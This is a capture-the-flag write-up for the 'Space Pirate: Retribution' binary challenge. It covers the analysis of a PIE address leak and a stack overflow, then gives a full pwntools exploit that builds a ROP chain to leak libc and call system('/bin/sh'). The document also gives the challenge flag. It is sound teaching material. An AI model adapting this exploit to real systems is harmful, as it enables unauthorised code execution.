# Space Pirate: Retribution

We are given the binary, linker and libc files.

Running `checksec`
```bash
gef➤  checksec
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

## Analysis
Decompiled `missile_launcher` function:
```
void missile_launcher(void)

{
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined local_38 [32];
  undefined8 local_18;
  undefined8 local_10;
  
  local_10 = 0x53e5854620fb399f;
  local_18 = 0x576b96b95df201f9;
  printf("\n[*] Current target\'s coordinates: x = [0x%lx], y = [0x%lx]\n\n[*] Insert new coordinate s: x = [0x%lx], y = "
         ,0x53e5854620fb399f,0x576b96b95df201f9,0x53e5854620fb399f);
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  read(0,local_38,0x1f);
  printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n) : "
         ,local_38);
  read(0,&local_58,0x84);
  printf("\n%s[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been re set!%s\n"
         ,&DAT_00100d70,&DAT_00100d78);
  return;
}
```

Interesting, `local_38` variable is of type `undefined`. Perhaps, it contains interesting data at initialization. Let's take a deeper look using `gef`.

When we break at `read(0,local_38,0x1f);`, RSI register is basically `local_38`. Interestingly, it contains some value.
```bash
──────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5624cef6ca8a <missile_launcher+104> mov    edx, 0x1f
   0x5624cef6ca8f <missile_launcher+109> mov    rsi, rax
   0x5624cef6ca92 <missile_launcher+112> mov    edi, 0x0
 → 0x5624cef6ca97 <missile_launcher+117> call   0x5624cef6c790 <read@plt>
   ↳  0x5624cef6c790 <read@plt+0>     jmp    QWORD PTR [rip+0x202812]        # 0x5624cf16efa8 <read@got.plt>
      0x5624cef6c796 <read@plt+6>     push   0x3
      0x5624cef6c79b <read@plt+11>    jmp    0x5624cef6c750
      0x5624cef6c7a0 <srand@plt+0>    jmp    QWORD PTR [rip+0x20280a]        # 0x5624cf16efb0 <srand@got.plt>
      0x5624cef6c7a6 <srand@plt+6>    push   0x4
      0x5624cef6c7ab <srand@plt+11>   jmp    0x5624cef6c750
──────────────────────────────────────────────────────────── arguments (guessed) ────
read@plt (
   $rdi = 0x0000000000000000,
   $rsi = 0x00007fffefb46700 → 0x00005624cef6cd68 →  sbb ebx, DWORD PTR [rbx+0x31],
   $rdx = 0x000000000000001f
)
```

In fact, `local_38` contains address that points to binary address.
```bash
gef➤  vmmap
0x00005624cef6c000 0x00005624cef6f000 0x0000000000000000 r-x /home/kali/Downloads/apocalyse/sp_retribution/sp_retribution
0x00005624cf16e000 0x00005624cf16f000 0x0000000000002000 r-- /home/kali/Downloads/apocalyse/sp_retribution/sp_retribution
0x00005624cf16f000 0x00005624cf170000 0x0000000000003000 rw- /home/kali/Downloads/apocalyse/sp_retribution/sp_retribution
-more-
```

If we submit only a newline character, it will only overwrite LSB of the address. We can still use the address to calculate base binary address. Effectively, it allows us to bypass PIE. 

Also, there is a buffer overflow vulnerability. The `read(0,&local_58,0x84);` (as shown above) reads 0x84 bytes of characters from stdin. However, the total size of local variables is less than 0x84. So, we can provide the typical ROP chain to get RCE.

## Exploit
Idea: Send newline character via `read()`. Leaks binary addresses via the following `printf()`. Calculate the base binary address to bypass PIE. Using the base binary address, calculate the address of `pop rdi; ret;` gadget in the binary, the address of `puts@plt` and `puts@got` (called before). Perform buffer overflow via the second `read()` to create a typical ROP chain (leaks `puts` libc address -> re-runs `main` function -> calculate `system` and `/bin/sh` address -> calls `system("/bin/sh")`) to obtain RCE.  
```python
from pwn import *

elf = ELF('./sp_retribution')
r = process(elf.path)
#r = elf.process()
#r = remote('167.71.138.246', 32450)
pause()

r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b'Insert new coordinates: x = [0x53e5854620fb399f], y = ', b'')
r.recvuntil(b'New coordinates: x = [0x53e5854620fb399f], y = ')
base_binary = u64((r.read(6)).ljust(8, b'\x00')) - 0xd0a 
print(hex(base_binary))

pop_rdi = base_binary + 0xd33
# puts_plt = base_binary + 0x790
puts_plt = base_binary + elf.plt['puts']
puts_got = base_binary + elf.got['puts']
main = base_binary + 0xc39
print(hex(pop_rdi))
print(hex(puts_plt))
print(hex(puts_got))

payload = b'A' * 80 
payload += b'B' * 8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)
r.recvuntil(b'Verify new coordinates? (y/n): ') 
r.sendline(payload)
r.readline()
r.readline()
leak_puts = u64((r.readline()[:-1]).ljust(8, b'\x00'))
base_libc = leak_puts - 0x6f6a0
bin_sh = base_libc + 0x18ce57
system = base_libc + 0x453a0
print(hex(leak_puts))

r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b'Insert new coordinates: x = [0x53e5854620fb399f], y = ', b'')
payload = b'A' * 80
payload += b"B" * 8
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
r.sendlineafter(b'Verify new coordinates? (y/n): ', payload)

r.interactive()
```


Flag: `HTB{d0_n0t_3v3R_pr355_th3_butt0n}`